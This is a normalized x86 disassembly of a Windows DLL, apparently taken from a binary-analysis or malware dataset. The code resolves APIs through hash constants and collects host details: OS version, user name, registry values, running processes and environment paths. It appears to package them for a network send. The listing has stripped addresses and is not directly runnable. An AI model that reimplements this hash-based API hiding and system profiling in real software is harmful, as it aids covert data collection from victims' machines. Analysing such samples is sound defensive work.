push esi
push [ esp + 0x28 ]
push ebp
call sub_10010ab0
add esp 0xc
mov esi ebp
call sub_100021e0
test eax eax
jne r-xdata
xor eax eax
push ebx
mov edi r--data
push edi
push ebp
push 0x2
mov esi 0xd74b3a69
push esi
mov ebx r--data
push ebx
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
push ebp
push eax
push edi
call [ HeapFree@IAT ]
jmp r-xdata
mov esi [ esp + 0x1c ]
jmp r-xdata
push [ esp + 0x20 ]
push 0x8
push [ esp + 0x20 ]
call [ HeapAlloc@IAT ]
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
push ebp
push 0x0
push [ esp + 0x20 ]
call [ HeapFree@IAT ]
mov eax esi
pop ebx
jmp r-xdata
push edi
push ebp
push 0x2
push esi
push ebx
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
xor esi esi
pop edi
pop esi
pop ebp
add esp 0x14
retn 0x8
push [ esp + 0x10 ]
push 0x0
push [ esp + 0x20 ]
call [ HeapFree@IAT ]
push edi
push ebp
push 0x2
push esi
push ebx
call sub_10001347
add esp 0x14
push eax
push [ esp + 0x14 ]
call [ lstrcpyA@IAT ]
push [ esp + 0x10 ]
call sub_10002b06
mov ebp [ esp + 0x2c ]
push edi
sub ebp eax
call sub_10002b06
add ebp eax
mov eax [ esp + 0x14 ]
push edi
add eax ebp
push eax
push 0x2
push esi
push ebx
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
mov ebp [ esp + 0x14 ]
push [ esp + 0x2c ]
push 0x0
push [ esp + 0x18 ]
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
mov eax [ esp + 0x2c ]
push edi
lea edi [ eax + ebp ]
push edi
push 0x2
push esi
push ebx
call sub_10001347
add esp 0x2c
push eax
push [ esp + 0x14 ]
call [ lstrcpyA@IAT ]
push [ esp + 0x20 ]
push 0x8
push [ esp + 0x20 ]
call [ HeapAlloc@IAT ]
mov [ esp + 0x1c ] eax
test eax eax
je r-xdata
push edi
call sub_10002b06
push [ esp + 0x10 ]
mov esi eax
call sub_10002b06
sub esi eax
je r-xdata
mov eax [ esp + 0x28 ]
push esi
add ebp eax
push ebp
push [ esp + 0x24 ]
call sub_10010ab0
add esp 0xc
sub_10004910
push ecx
push ebx
push ebp
push esi
push edi
call [ GetProcessHeap@IAT ]
push 0xb1
mov ebp eax
push 0x8
push ebp
call [ HeapAlloc@IAT ]
mov esi [ esp + 0x18 ]
mov edi eax
push esi
mov [ esp + 0x14 ] edi
call sub_10002b06
mov ebx eax
mov eax 0xb0
cmp ebx eax
ja r-xdata
push 0x2c
sub ebx eax
pop ecx
lea eax [ ebx + 0x2 ]
push eax
push 0x8
add esi ebx
push ebp
[ edi ] [ esi ]
call [ HeapAlloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
jne r-xdata
push edi
push 0x0
push ebx
push [ esp + 0x1c ]
push esi
call sub_10010ab0
mov ebx [ esp + 0x1c ]
add esp 0xc
push ebx
push esi
call sub_10005c9b
push ebx
push edi
push ebp
test eax eax
jne r-xdata
push [ esp + 0x10 ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x4
call [ HeapFree@IAT ]
mov eax esi
mov ebx [ HeapFree@IAT ]
call ebx
push esi
push edi
push ebp
call ebx
jmp r-xdata
push ebp
call [ HeapFree@IAT ]
xor eax eax
jmp r-xdata
sub_100049b8
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov eax 0x4c4b40
push esi
xor esi esi
push eax
mov [ ebp - 0xc ] esi
or ebx 0xffffffff
mov [ ebp - 0x10 ] eax
call sub_1000ff5a
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp + 0x8 ] esi
jne r-xdata
push edi
mov [ ebp - 0x4 ] esi
mov edi r--data
mov esi 0x80000001
xor eax eax
jmp r-xdata
mov ebx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xf
jl r-xdata
pop esi
pop ebx
leave
retn 0x8
push 0x3
push [ ebx * 4 + rw-data ]
push edi
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10001e34
pop edi
test eax eax
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
push [ eax * 4 + rw-data ]
lea eax [ ebp - 0x10 ]
push edi
push esi
push eax
push [ ebp - 0x8 ]
call sub_10001edd
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0xc ] 0x1
push [ ebp - 0x8 ]
call sub_1000fe7d
pop ecx
cmp ebx 0xffffffff
jne r-xdata
sub_10004a56
mov eax 0x1020
call sub_10010a80
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x101c ] eax
push ebx
push esi
push edi
call [ GetProcessHeap@IAT ]
mov edi r--data
push edi
mov [ esp + 0x10 ] eax
xor ebx ebx
xor esi esi
call sub_1000231a
test eax eax
jne r-xdata
mov ecx [ esp + 0x1028 ]
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_1000fe6e
add esp 0x1020
retn 0x4
push edi
call sub_10002359
test eax eax
jne r-xdata
mov ebp [ HeapFree@IAT ]
mov [ esp + 0x20 ] ebx
mov edi 0x400
push 0x18
mov [ esp + 0x18 ] ebx
mov [ esp + 0x20 ] ebx
call sub_1000ff5a
push 0x18
push ebx
mov esi eax
push esi
push 0x3
push 0x9af9fa4b
mov ebx r--data
push ebx
call sub_10001347
push edi
call sub_1000ff5a
push edi
mov [ esi ] eax
call sub_1000ff5a
push edi
push 0x0
push [ esi ]
mov [ esi + 0x4 ] eax
push 0x3
push 0x9af9fa4b
push ebx
call sub_10001347
push edi
push 0x0
push [ esi + 0x4 ]
push 0x3
push 0x9af9fa4b
push ebx
call sub_10001347
add esp 0x54
mov [ esp + 0x10 ] edi
push [ esi + 0x4 ]
push edi
push [ esi ]
push [ esp + 0x2c ]
call sub_1000431e
mov [ esp + 0x20 ] eax
test eax eax
jl r-xdata
push esi
push ebx
push [ esp + 0x14 ]
call ebp
push [ esi ]
call sub_1000fe7d
push [ esi + 0x4 ]
call sub_1000fe7d
push esi
call sub_1000fe7d
add esp 0xc
mov [ esp + 0x10 ] edi
mov ebx [ esi + 0x4 ]
push edi
call sub_1000144e
lea eax [ esp + 0x28 ]
push eax
lea ebx [ esp + 0x14 ]
mov [ esp + 0x14 ] 0x1000
call sub_10004170
xor ecx ecx
inc ecx
mov [ esi + 0x14 ] ecx
cmp [ esp + 0x10 ] 0x0
mov [ esp + 0x24 ] eax
jbe r-xdata
push r--data
call [ LoadLibraryW@IAT ]
test eax eax
je r-xdata
cmp eax 0x493e0
jle r-xdata
and [ esi + 0x14 ] 0x0
push edi
push 0x8
push [ esp + 0x14 ]
call [ HeapAlloc@IAT ]
test eax eax
jl r-xdata
xor eax eax
push eax
push 0x493e0
call sub_10001d8e
jmp r-xdata
push eax
push 0x1
push 0x9ace3327
push r--data
call sub_10001347
mov esi [ esp + 0x24 ]
add esp 0x10
xor ebx ebx
jmp r-xdata
test ebx ebx
je r-xdata
push eax
push 0x0
push [ esp + 0x14 ]
call ebp
mov [ esi + 0x14 ] ecx
lea ecx [ esp + 0x14 ]
push ecx
push eax
lea eax [ esi + 0xc ]
push eax
lea eax [ esp + 0x28 ]
call sub_100044e8
jmp r-xdata
cmp eax 0x7530
jl r-xdata
cmp esi ebx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jbe r-xdata
mov ecx esi
mov [ esi + 0x8 ] eax
call sub_10001b2c
mov ebx eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push [ esi + 0x4 ]
call sub_10002ade
push eax
mov [ esp + 0x14 ] eax
push [ esi + 0x4 ]
call sub_10001561
push [ ebx + 0x4 ]
push [ ebx ]
call sub_10004762
push [ ebx ]
mov [ esp + 0x1c ] eax
push 0x0
push [ esp + 0x14 ]
call ebp
push ebx
push 0x0
push [ esp + 0x14 ]
call ebp
cmp [ esp + 0x18 ] 0x0
je r-xdata
cmp [ esp + 0x1c ] 0x0
je r-xdata
push [ esp + 0x24 ]
call sub_10004226
push [ esp + 0x18 ]
call sub_10002b06
test eax eax
jbe r-xdata
mov ebx [ esp + 0x14 ]
test ebx ebx
je r-xdata
push [ esp + 0x18 ]
push 0x0
push [ esp + 0x14 ]
call ebp
push [ esp + 0x18 ]
call sub_10004910
mov ebx eax
test ebx ebx
je r-xdata
push ebx
push 0x1
push 0x4856bd25
push r--data
call sub_10001347
add esp 0x10
push ebx
push 0x0
push [ esp + 0x14 ]
call ebp
and [ esp + 0x14 ] 0x0
push ebx
call sub_10002b06
test eax eax
je r-xdata
push ebx
push 0x0
push [ esp + 0x14 ]
call ebp
push eax
push ebx
call sub_100049b8
sub_10004cfb
push ebx
push edi
xor ebx ebx
call [ GetProcessHeap@IAT ]
mov edi eax
mov eax [ esi ]
mov [ esi + 0x4 ] ebx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x8 ]
inc eax
inc eax
add [ esi + 0x4 ] eax
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
push ecx
cmp eax ebx
jne r-xdata
push eax
push ebx
push edi
call [ HeapSize@IAT ]
mov [ esi + 0x4 ] eax
push eax
push 0x8
push edi
call [ HeapReAlloc@IAT ]
push 0x8
push edi
call [ HeapAlloc@IAT ]
jmp r-xdata
pop edi
mov eax ebx
pop ebx
retn
xor ebx ebx
inc ebx
mov [ esi ] eax
cmp eax ebx
je r-xdata
sub_10004d51
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0xe0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x74 ] eax
and [ ebp - 0x68 ] 0x0
push esi
push edi
push 0x36
pop ecx
lea eax [ ebp - 0x64 ]
mov esi r--data
lea edi [ ebp - 0x64 ]
push eax
[ edi ] [ esi ]
call sub_10002ade
inc eax
inc eax
mov esi ebx
mov [ ebx + 0x8 ] eax
call sub_10004cfb
pop edi
pop esi
test eax eax
je r-xdata
mov ecx [ ebp + 0x74 ]
mov eax [ ebp - 0x68 ]
xor ecx ebp
call sub_1000fe6e
add ebp 0x78
leave
retn
lea eax [ ebp - 0x64 ]
push eax
push [ ebx ]
push 0x2
push 0x825884e9
push r--data
call sub_10001347
add esp 0x14
mov [ ebp - 0x68 ] 0x1
sub_10004dc7
push ecx
push ecx
and [ esp + 0x4 ] 0x0
push ebp
push esi
push edi
mov esi eax
call [ GetProcessHeap@IAT ]
push [ esp + 0x18 ]
mov [ esp + 0x10 ] eax
call sub_10002ade
push [ esp + 0x1c ]
mov edi eax
call sub_10002ade
lea eax [ edi + eax * 2 + 0x28 ]
push eax
push 0x8
push [ esp + 0x14 ]
call [ HeapAlloc@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
pop ecx
pop ecx
retn 0x8
push ebx
push r--data
push ebp
push 0x2
mov ebx 0x6e587d69
push ebx
mov edi r--data
push edi
call sub_10001347
push [ esp + 0x34 ]
push ebp
push 0x2
push ebx
push edi
call sub_10001347
push r--data
push ebp
push 0x2
push ebx
push edi
call sub_10001347
push [ esp + 0x58 ]
push ebp
push 0x2
push ebx
push edi
call sub_10001347
add esp 0x50
push r--data
push ebp
push 0x2
push ebx
push edi
call sub_10001347
push [ esp + 0x34 ]
push ebp
push 0x2
push ebx
push edi
call sub_10001347
push r--data
push ebp
push 0x2
push ebx
push edi
call sub_10001347
add esp 0x3c
push ebp
call sub_10002ade
inc eax
inc eax
mov [ esi + 0x8 ] eax
call sub_10004cfb
test eax eax
je r-xdata
push ebp
push 0x0
push [ esp + 0x18 ]
call [ HeapFree@IAT ]
mov eax [ esp + 0x14 ]
pop ebx
push ebp
push [ esi ]
push 0x2
push ebx
push edi
call sub_10001347
add esp 0x14
mov [ esp + 0x14 ] 0x1
sub_10004ec8
push ebx
push esi
push edi
mov edi r--data
push edi
mov esi eax
xor ebx ebx
call sub_10002ade
inc eax
inc eax
mov [ esi + 0x8 ] eax
call sub_10004cfb
test eax eax
je r-xdata
push edi
push [ esi ]
push 0x2
push 0x6e587d69
push r--data
call sub_10001347
add esp 0x14
pop edi
pop esi
mov eax ebx
pop ebx
retn
inc ebx
sub_10004f06
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
push r--data
push r--data
push 0x80000001
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_10001edd
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
jbe r-xdata
xor eax eax
inc eax
jmp r-xdata
retn 0x8
sub_10004f3e
push ebp
lea ebp [ esp - 0x74 ]
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x70 ] eax
mov eax [ ebp + 0x7c ]
and [ ebp - 0x19c ] 0x0
push ebx
push esi
push edi
push 0x78
push 0x0
mov [ ebp - 0x198 ] eax
lea eax [ ebp - 0x80 ]
push eax
push 0x3
mov edi 0x9af9fa4b
mov ebx ecx
push edi
mov esi r--data
push esi
mov [ ebp - 0x1a0 ] ebx
call sub_10001347
add esp 0x18
lea eax [ ebp - 0x194 ]
push eax
mov [ ebp - 0x194 ] 0x114
call [ GetVersionExW@IAT ]
cmp [ ebp - 0x190 ] 0x4
jne r-xdata
cmp [ ebp - 0x190 ] 0x5
jne r-xdata
cmp [ ebp - 0x18c ] 0x0
jne r-xdata
cmp [ ebp - 0x190 ] 0x6
jne r-xdata
cmp [ ebp - 0x18c ] 0x0
jne r-xdata
cmp [ ebp - 0x18c ] 0xa
jne r-xdata
cmp [ ebp - 0x184 ] 0x1
mov ebx r--data
jne r-xdata
push r--data
cmp [ ebp - 0x18c ] 0x0
jne r-xdata
cmp [ ebp - 0x18c ] 0x1
jne r-xdata
push r--data
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5a
jne r-xdata
push r--data
jmp r-xdata
cmp [ ebp - 0x184 ] 0x2
jne r-xdata
push r--data
lea eax [ ebp - 0x80 ]
push eax
push 0x2
push 0x825884e9
push ebx
call sub_10001347
add esp 0x14
mov ecx [ ebp + 0x70 ]
mov eax [ ebp - 0x19c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0x74
leave
retn 0x4
cmp [ ebp - 0x180 ] 0x0
je r-xdata
cmp [ ebp - 0x18c ] 0x1
jne r-xdata
push r--data
jmp r-xdata
cmp [ ebp - 0x18c ] 0x2
jne r-xdata
push r--data
jmp r-xdata
lea eax [ ebp - 0x80 ]
push eax
push 0x2
push 0x825884e9
push r--data
call sub_10001347
push r--data
jmp r-xdata
push r--data
lea eax [ ebp - 0x80 ]
push eax
push 0x2
push 0x825884e9
push ebx
call sub_10001347
mov ebx [ ebp - 0x1a0 ]
jmp r-xdata
push [ ebx ]
push 0x0
push [ ebp - 0x198 ]
push 0x3
push edi
push esi
call sub_10001347
lea eax [ ebp - 0x180 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
push r--data
push [ ebp - 0x198 ]
call [ wsprintfW@IAT ]
add esp 0x28
push [ ebp - 0x198 ]
call sub_10002ade
mov [ ebx ] eax
mov [ ebp - 0x19c ] 0x1
push r--data
jmp r-xdata
push r--data
jmp r-xdata
add esp 0x14
cmp [ ebp - 0x184 ] 0x2
jne r-xdata
sub_1000511f
push ecx
push ebx
push ebp
push [ esi ]
push 0x0
push edi
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
push 0x0
push [ esi ]
lea eax [ esp + 0x28 ]
push edi
push eax
push 0x4
push 0x265f46e1
push r--data
call sub_10001347
add esp 0x34
mov ebp 0x825884e9
mov ebx r--data
test eax eax
jne r-xdata
test [ esp + 0x8 ] 0x1
je r-xdata
push r--data
push edi
push 0x2
push ebp
push ebx
call sub_10001347
add esp 0x14
push r--data
push edi
push 0x2
push ebp
push ebx
call sub_10001347
add esp 0x14
push esi
push 0x0
push edi
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
push r--data
push edi
push 0x2
push ebp
push ebx
call sub_10001347
add esp 0x2c
jmp r-xdata
push edi
call sub_10002ade
mov [ esi ] eax
xor eax eax
pop ebp
inc eax
pop ebx
pop ecx
retn
sub_100051c7
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x314
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x310 ] eax
mov eax [ ebp + 0x8 ]
and [ esp + 0x8 ] 0x0
push ebx
push esi
push edi
mov edi ecx
push [ edi ]
mov ebx r--data
push 0x0
push eax
push 0x3
push 0x9af9fa4b
push ebx
mov [ esp + 0x28 ] eax
mov [ esp + 0x3c ] edi
call sub_10001347
lea eax [ esp + 0x50 ]
push eax
push 0x101
push 0x2
push 0x7dab7d22
mov esi r--data
push esi
call sub_10001347
add esp 0x2c
test eax eax
je r-xdata
push 0x50
lea eax [ esp + 0x1cc ]
push eax
push 0x2
push 0x41bd7b01
push esi
call sub_10001347
add esp 0x14
neg eax
sbb eax eax
inc eax
cmp eax 0xffffffff
jne r-xdata
xor eax eax
lea eax [ esp + 0x1c8 ]
push eax
push 0x1
push 0xb920941d
push esi
call sub_10001347
add esp 0x10
mov [ esp + 0x1c ] eax
test eax eax
jne r-xdata
push 0x1
push 0xfc997a29
push esi
call sub_10001347
add esp 0xc
jmp r-xdata
mov eax [ eax + 0xc ]
and [ esp + 0x18 ] 0x0
cmp [ eax ] 0x0
je r-xdata
xor edi edi
push [ esp + 0x10 ]
call sub_10002ade
mov [ edi ] eax
mov edi [ esp + 0x14 ]
jmp r-xdata
xor edi edi
mov ecx [ esp + 0x31c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000fe6e
mov esp ebp
pop ebp
retn 0x4
push 0x1
push 0xfc997a29
push esi
call sub_10001347
add esp 0xc
mov eax edi
jmp r-xdata
inc [ esp + 0x18 ]
mov edi [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov eax [ eax + 0xc ]
shl edi 0x2
cmp [ edi + eax ] 0x0
jne r-xdata
cmp [ esp + 0x14 ] eax
je r-xdata
mov eax 0x80
push eax
push 0x0
mov [ esp + 0x28 ] eax
lea eax [ esp + 0x220 ]
push eax
push 0x3
push 0x9af9fa4b
push ebx
call sub_10001347
push 0x2
pop eax
mov [ esp + 0x40 ] ax
mov eax [ esp + 0x34 ]
mov eax [ eax + 0xc ]
mov eax [ edi + eax ]
mov eax [ eax ]
mov [ esp + 0x44 ] eax
lea eax [ esp + 0x38 ]
push eax
lea eax [ esp + 0x234 ]
push eax
push 0x0
push 0x10
lea eax [ esp + 0x50 ]
push eax
push 0x5
push 0xfa353be2
push esi
call sub_10001347
add esp 0x38
test eax eax
jne r-xdata
mov edi [ esp + 0x24 ]
lea eax [ esp + 0x218 ]
push eax
push [ esp + 0x14 ]
push 0x2
push 0x6e587d69
push r--data
call sub_10001347
add esp 0x14
mov [ esp + 0x14 ] 0x1
push r--data
push [ esp + 0x14 ]
push 0x2
push 0x6e587d69
push r--data
call sub_10001347
add esp 0x14
sub_100053ad
push ebp
lea ebp [ esp - 0x394 ]
sub esp 0x414
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x390 ] eax
mov eax [ ebp + 0x39c ]
push ebx
push esi
push [ eax ]
mov ebx r--data
push 0x0
push ecx
push 0x3
push 0x9af9fa4b
push ebx
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x80 ] eax
call sub_10001347
lea eax [ ebp - 0x70 ]
push eax
push 0x200
push 0x2
push 0x53abcd25
mov esi r--data
push esi
call sub_10001347
add esp 0x2c
test eax eax
ja r-xdata
dec eax
shr eax 0x2
lea ecx [ ebp - 0x70 ]
inc eax
push edi
mov [ ebp - 0x78 ] ecx
mov [ ebp - 0x7c ] eax
mov edi 0x6e587d69
xor eax eax
jmp r-xdata
push r--data
dec eax
je r-xdata
mov ecx [ ebp + 0x390 ]
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0x394
leave
retn 0x4
mov eax [ ebp - 0x78 ]
push 0x2
push 0x0
add eax 0x4
push eax
push 0x3
push 0x9af9fa4b
push ebx
call sub_10001347
push [ ebp - 0x78 ]
push [ ebp - 0x74 ]
push 0x2
push edi
push esi
call sub_10001347
push [ ebp - 0x78 ]
push 0x1
push 0xaa2f50c3
push esi
call sub_10001347
add esp 0x3c
push 0x2
pop ecx
sub eax ecx
je r-xdata
push [ ebp - 0x74 ]
call sub_10002ade
mov ecx [ ebp - 0x80 ]
mov [ ecx ] eax
xor eax eax
inc eax
pop edi
push r--data
jmp r-xdata
dec eax
je r-xdata
push [ ebp - 0x74 ]
push ecx
push edi
push esi
call sub_10001347
add esp 0x14
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
jne r-xdata
add [ ebp - 0x78 ] 0x8
dec [ ebp - 0x7c ]
jne r-xdata
push r--data
jmp r-xdata
sub_100054dd
push ebp
lea ebp [ esp - 0x9c4 ]
sub esp 0xa44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x9c0 ] eax
push ebx
push esi
push edi
mov ebx edx
xor edi edi
mov esi ecx
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x70 ] edi
call [ GetProcessHeap@IAT ]
push [ ebx ]
mov ebx r--data
push edi
push [ esi ]
mov [ ebp - 0x78 ] eax
push 0x3
push 0x9af9fa4b
push ebx
call sub_10001347
push edi
push 0xbdd269db
mov edi r--data
push edi
call sub_10001347
push eax
push 0x2
push 0x2
push 0xaa85fd7f
push edi
call sub_10001347
add esp 0x38
mov [ ebp - 0x74 ] eax
cmp eax 0xffffffff
jne r-xdata
push 0x22c
push 0x0
lea eax [ ebp - 0x6c ]
push eax
push 0x3
push 0x9af9fa4b
push ebx
call sub_10001347
add esp 0x18
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x74 ]
mov [ ebp - 0x6c ] 0x22c
call Process32FirstW
jmp r-xdata
xor eax eax
test eax eax
jne r-xdata
push 0x400
push 0x0
lea eax [ ebp + 0x1c0 ]
push eax
push 0x3
push 0x9af9fa4b
push ebx
call sub_10001347
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp + 0x1c0 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x24
push [ esi ]
push 0x0
push [ ebp - 0x78 ]
call [ HeapSize@IAT ]
push [ esi ]
mov [ ebp - 0x7c ] eax
call sub_10002ade
mov [ ebp - 0x70 ] eax
lea eax [ ebp + 0x1c0 ]
push eax
call sub_10002ade
mov ecx [ ebp - 0x70 ]
lea eax [ ecx + eax + 0x2 ]
cmp [ ebp - 0x7c ] eax
jae r-xdata
push [ esi ]
call sub_10002ade
mov ecx [ ebp - 0x80 ]
mov esi [ ebp - 0x70 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push eax
push [ esi ]
push 0x8
push [ ebp - 0x78 ]
call [ HeapReAlloc@IAT ]
mov [ esi ] eax
push [ ebp - 0x74 ]
push 0x1
push 0xed00c776
push edi
call sub_10001347
add esp 0x10
mov eax esi
jmp r-xdata
xor esi esi
lea ecx [ ebp + 0x1c0 ]
push ecx
push eax
push 0x2
push 0x6e587d69
push edi
call sub_10001347
add esp 0x14
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x74 ]
mov [ ebp - 0x70 ] 0x1
call Process32NextW
mov ecx [ ebp + 0x9c0 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0x9c4
leave
retn
sub_1000567c
push ebx
push esi
push edi
xor ebx ebx
call [ GetProcessHeap@IAT ]
push 0x200
mov edi eax
push 0x8
push edi
call [ HeapAlloc@IAT ]
push 0x100
mov esi eax
push esi
push r--data
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
ja r-xdata
push r--data
push esi
push 0x2
push 0x6e587d69
push r--data
call sub_10001347
add esp 0x14
push [ esp + 0x10 ]
push esi
push 0x1
call sub_1000256f
mov ecx [ esp + 0x14 ]
mov [ ecx ] eax
test eax eax
jbe r-xdata
xor eax eax
jmp r-xdata
push esi
push 0x0
push edi
call [ HeapFree@IAT ]
mov eax ebx
xor ebx ebx
inc ebx
pop edi
pop esi
pop ebx
retn 0x8
sub_100056f7
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
call [ GetProcessHeap@IAT ]
mov esi 0x400
push esi
xor ebx ebx
push 0x8
push eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] ebx
call [ HeapAlloc@IAT ]
mov edi eax
mov [ ebp - 0x8 ] edi
cmp edi ebx
jne r-xdata
lea ebx [ ebp - 0x18 ]
call sub_10004d51
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x10 ]
push eax
push edi
mov [ ebp - 0x10 ] esi
call sub_10004f06
test eax eax
je r-xdata
push edi
push edi
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] esi
call sub_10004f3e
test eax eax
je r-xdata
push r--data
push edi
lea eax [ ebp - 0x18 ]
call sub_10004dc7
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edi
mov [ ebp - 0x10 ] esi
call [ GetUserNameW@IAT ]
test eax eax
je r-xdata
push r--data
push edi
lea eax [ ebp - 0x18 ]
call sub_10004dc7
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edi
push 0x2
push 0xde56160f
push r--data
mov [ ebp - 0x10 ] esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
push r--data
push edi
lea eax [ ebp - 0x18 ]
call sub_10004dc7
test eax eax
je r-xdata
push r--data
push r--data
mov ebx 0x80000001
push ebx
lea eax [ ebp - 0x10 ]
push eax
push edi
mov [ ebp - 0x10 ] esi
call sub_10001edd
test eax eax
je r-xdata
push r--data
push edi
lea eax [ ebp - 0x18 ]
call sub_10004dc7
test eax eax
je r-xdata
push r--data
push r--data
push ebx
lea eax [ ebp - 0x10 ]
push eax
push edi
mov [ ebp - 0x10 ] esi
call sub_10001edd
test eax eax
je r-xdata
push r--data
push edi
lea eax [ ebp - 0x18 ]
call sub_10004dc7
test eax eax
je r-xdata
push r--data
push r--data
push ebx
lea eax [ ebp - 0x10 ]
push eax
push edi
mov [ ebp - 0x10 ] esi
call sub_10001edd
test eax eax
je r-xdata
push r--data
push edi
lea eax [ ebp - 0x18 ]
call sub_10004dc7
test eax eax
je r-xdata
mov [ ebp - 0x10 ] esi
lea esi [ ebp - 0x10 ]
call sub_1000511f
push r--data
push edi
lea eax [ ebp - 0x18 ]
call sub_10004dc7
push edi
test eax eax
je r-xdata
push r--data
push edi
lea eax [ ebp - 0x18 ]
call sub_10004dc7
test eax eax
je r-xdata
push 0x0
push [ ebp - 0x4 ]
call [ HeapFree@IAT ]
jmp r-xdata
mov esi 0x400
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] esi
call sub_100051c7
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx edi
mov [ ebp - 0x10 ] esi
call sub_100053ad
test eax eax
je r-xdata
push r--data
push edi
lea eax [ ebp - 0x18 ]
call sub_10004dc7
test eax eax
je r-xdata
push esi
push edi
mov [ ebp - 0x10 ] esi
call sub_10002bbb
test eax eax
je r-xdata
push r--data
push edi
lea eax [ ebp - 0x18 ]
call sub_10004dc7
test eax eax
je r-xdata
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] esi
call sub_100054dd
test eax eax
je r-xdata
push r--data
push edi
lea eax [ ebp - 0x18 ]
call sub_10004dc7
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_1000567c
test eax eax
je r-xdata
push r--data
push [ ebp - 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_10004dc7
test eax eax
jne r-xdata
push [ ebp - 0xc ]
mov esi [ HeapFree@IAT ]
xor ebx ebx
push ebx
push [ ebp - 0x4 ]
call esi
lea eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] ebx
call sub_10004ec8
test eax eax
jne r-xdata
push r--data
push [ ebp - 0xc ]
lea eax [ ebp - 0x18 ]
call sub_10004dc7
test eax eax
je r-xdata
push [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x2
push eax
push 0x8
push [ ebp + 0x8 ]
call [ HeapAlloc@IAT ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x8 ]
push ebx
push [ ebp - 0x4 ]
call esi
jmp r-xdata
push [ ebp - 0x18 ]
push eax
push 0x2
push 0x825884e9
push r--data
call sub_10001347
xor edi edi
add esp 0x14
inc edi
jmp r-xdata
xor edi edi
push [ ebp - 0x8 ]
push ebx
push [ ebp - 0x4 ]
call esi
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_100059ef
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
call [ GetProcessHeap@IAT ]
mov edi eax
lea eax [ ebp - 0x4 ]
push eax
xor ebx ebx
push edi
mov [ ebp - 0x4 ] ebx
call sub_100056f7
test eax eax
je r-xdata
xor eax eax
call sub_100033fe
push [ ebp - 0x4 ]
mov esi eax
mov [ ebp - 0x8 ] esi
cmp esi ebx
jne r-xdata
call sub_10002ade
push eax
push [ ebp - 0x4 ]
push esi
call sub_100029d9
test eax eax
jne r-xdata
push ebx
push edi
call [ HeapFree@IAT ]
push esi
call sub_10002ade
push 0x11ab
push 0x1010
push eax
push esi
call sub_10003f6c
test eax eax
je r-xdata
push [ ebp - 0x4 ]
mov esi [ HeapFree@IAT ]
push ebx
push edi
call esi
